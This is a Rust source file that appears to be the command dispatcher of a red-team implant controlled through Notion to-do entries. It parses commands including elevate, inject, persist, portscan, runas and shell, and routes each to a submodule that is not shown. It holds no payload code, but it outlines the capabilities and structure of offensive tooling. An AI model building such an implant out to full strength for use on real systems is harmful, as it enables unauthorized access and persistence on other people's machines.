// Standard Library Imports
use std::error::Error;
use std::iter::Iterator;
use std::result::Result;
use core::str::Split;
use std::fmt;
// Local imports
use crate::config::ConfigOptions;
use crate::logger::Logger;
// Command modules
mod cd;
mod download;
pub mod elevate;
pub mod getprivs;
mod inject;
mod persist;
mod portscan;
mod ps;
mod pwd;
mod runas;
mod save;
pub mod shell;
mod sleep;
mod shutdown;
mod whoami;
mod unknown;
mod createthread;

/// All the possible command types. Some have command strings, and some don't.
pub enum CommandType {
    Cd,
    Download,
    Elevate,
    Getprivs,
    Inject,
    Portscan,
    Persist,
    Ps,
    Pwd,
    Save,
    Runas,
    Shell,
    Shutdown,
    Sleep,
    Whoami,
    Unknown
}

/// Simple errors for the construction of a NotionCommand.
/// Returned if construction fails.
#[derive(Debug)]
pub struct CommandError(String);
impl Error for CommandError {}

impl fmt::Display for CommandError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.0)
    }
}

/// A custom struct for our command arguments
/// This allow easier passing and safety for them.
/// 
/// As an `Iterator`, `CommandArgs` and be unwrapped with default
/// values as a safety for missing or malformed args.
#[derive(Debug)]
pub struct CommandArgs {
    items: Vec<String>,
    count: usize
}


impl CommandArgs {

    /// Default constructor for `CommandArgs`.
    /// 
    /// Handy to have in modules that use other modules as 
    /// part of their operation.
    pub fn new(args: Vec<String> ) -> CommandArgs {
        CommandArgs { items: args, count: 0 }
    }

    /// This is the constructor we use to build `CommandArgs` from
    /// the incoming `Split<&str>`. It might seem goofy, but 
    /// it's a clean way to get the first arg and then build our 
    /// `CommandArgs`.
    pub fn from_split(args_split: Split<&str> ) -> CommandArgs {
        let items: Vec<String> = args_split
            .map(|a| a.trim().to_string())
            .collect();
        CommandArgs { items: items, count: 0 }
    }

    pub fn from_string(args_string: String) -> CommandArgs {
        let items: Vec<String> = args_string
            .split(" ")
            .map(|s| s.trim().to_string())
            .collect();

        CommandArgs { items: items, count: 0 }
    }

    /// Converts the args into a space-separated string.
    /// 
    /// Real handy for shell commands.
    pub fn to_string(&self) -> String {
        self.items
            .as_slice()
            .join(" ")
            .trim()
            .to_string()
    }
}

impl Iterator for CommandArgs {
    type Item = String;

    fn next(&mut self) -> Option<Self::Item> {

        if self.items.len() > self.count {
            self.count += 1;
            Some(self.items[self.count - 1].to_string())
        } else {
            None
        }
    }
}


/// The command itself, containing the `CommandType` enum
pub struct NotionCommand {
    pub command_type: CommandType,
    pub args: CommandArgs
}

impl NotionCommand {
    /// Constructor for `NotionCommands`. Takes the raw string from the `to_do`.
    pub fn from_string(command_str: String) -> Result<NotionCommand, CommandError> {
        let mut command_words = command_str.split(" ");
        // Taking the first command advances the iterator, so the remaining 
        // items should be the command data.
        // The call to this function clears the target emoji
        // TODO: Maybe do that here?
        if let Some(t) = command_words.nth(0) {

            let command_args  = CommandArgs::from_split(command_words);

            let command_type: CommandType = match t {
                "cd"       => CommandType::Cd,
                "download" => CommandType::Download,
                "elevate"  => CommandType::Elevate,
                "getprivs" => CommandType::Getprivs,
                "inject"   => CommandType::Inject,
                "persist"  => CommandType::Persist,
                "portscan" => CommandType::Portscan,
                "ps"       => CommandType::Ps,
                "pwd"      => CommandType::Pwd,
                "runas"    => CommandType::Runas,
                "save"     => CommandType::Save,
                "shell"    => CommandType::Shell,
                "shutdown" => CommandType::Shutdown,
                "sleep"    => CommandType::Sleep,
                "whoami"   => CommandType::Whoami,
                _          => CommandType::Unknown,
            };
            return Ok(NotionCommand { command_type: command_type, args: command_args});

        } else {
            Err(CommandError("Could not parse command!".to_string()))
        }
    }
    /// Executes the appropriate function for the `command_type`. 
    pub async fn handle(&mut self, config_options: &mut ConfigOptions, logger: &Logger) -> Result<String, Box<dyn Error>> {
        match &self.command_type {
            CommandType::Cd       => cd::handle(&mut self.args),
            CommandType::Download => download::handle( &mut self.args, logger).await,
            CommandType::Elevate  => elevate::handle(&mut self.args, config_options).await,
            CommandType::Getprivs    => getprivs::handle().await,
            CommandType::Inject   => inject::handle(&mut self.args, logger).await,
            CommandType::Persist  => persist::handle(&mut self.args, config_options, logger).await,
            CommandType::Portscan => portscan::handle(&mut self.args, logger).await,
            CommandType::Ps          => ps::handle().await,
            CommandType::Pwd         => pwd::handle().await,
            CommandType::Runas    => runas::handle(&self.args).await,
            CommandType::Save     => save::handle(&mut self.args, config_options).await,
            CommandType::Shell    => shell::handle(&mut self.args).await,
            CommandType::Shutdown    => shutdown::handle().await,
            CommandType::Sleep    => sleep::handle(&mut self.args, config_options).await,
            CommandType::Whoami      => whoami::handle().await,
            CommandType::Unknown  => unknown::handle().await,
        }
    }
}